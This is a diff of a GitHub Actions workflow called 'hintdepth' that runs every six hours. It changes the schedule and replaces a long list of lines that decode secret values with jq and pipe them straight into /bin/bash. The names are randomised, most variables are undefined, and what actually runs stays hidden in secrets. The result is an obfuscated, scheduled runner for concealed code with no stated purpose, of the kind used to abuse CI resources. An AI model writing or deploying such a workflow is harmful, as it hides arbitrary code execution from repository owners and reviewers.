@@ -2,8 +2,7 @@ name: hintdepth
 on:
   workflow_dispatch:
   schedule:
-    - cron: '2 1/6 * * *'
-
+    - cron: '39 3/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
@@ -12,24 +11,19 @@ jobs:
       - uses: actions/checkout@v4
       - name: hintdepth
         env:
-          tp4070: ${{ secrets.tp4070 }}
+          loeq29: ${{ secrets.loeq29 }}
         run: |
-          echo $tp4070 | jq -r .bie423 | /bin/bash
-          echo $szzj10 | jq -r .h3 | /bin/bash
-          echo $kod527 | jq -r .mqasf41815 | /bin/bash
-          echo $wvu38 | jq -r .ry41 | /bin/bash
-          echo $km05575 | jq -r .ty7 | /bin/bash
-          echo $am88 | jq -r .aya15 | /bin/bash
-          echo $svllt72212 | jq -r .rh9 | /bin/bash
-          echo $f4774 | jq -r .hsz272 | /bin/bash
-          echo $yucq823 | jq -r .bpgo891 | /bin/bash
-          echo $jgd7 | jq -r .tkie81929 | /bin/bash
-          echo $pdks0475 | jq -r .fonq96235 | /bin/bash
-          echo $khwy2021 | jq -r .mi44958 | /bin/bash
-          echo $s257 | jq -r .b09 | /bin/bash
-          echo $uhnyi0 | jq -r .hgi15 | /bin/bash
-          echo $na19 | jq -r .sxk751 | /bin/bash
-          echo $irza025 | jq -r .uipg2073 | /bin/bash
-          echo $znzf10 | jq -r .emauj407 | /bin/bash
-          echo $hpofa13 | jq -r .bqin9893 | /bin/bash
+          echo $loeq29 | jq -r .be82 | /bin/bash
+          echo $zumvh45419 | jq -r .ddfyv8911 | /bin/bash
+          echo $xru4107 | jq -r .juw0 | /bin/bash
+          echo $t5 | jq -r .fa46663 | /bin/bash
+          echo $xz8237 | jq -r .b94406 | /bin/bash
+          echo $pyi88 | jq -r .ilow26871 | /bin/bash
+          echo $sipe208 | jq -r .tgh6245 | /bin/bash
+          echo $fjjh0271 | jq -r .flfa731 | /bin/bash
+          echo $pjxo2503 | jq -r .km87308 | /bin/bash
+          echo $bdc5 | jq -r .webi27 | /bin/bash
+          echo $oq52 | jq -r .zdbf47378 | /bin/bash
+          echo $d79651 | jq -r .q97 | /bin/bash
+          echo $rjwh425 | jq -r .spr38762 | /bin/bash
 
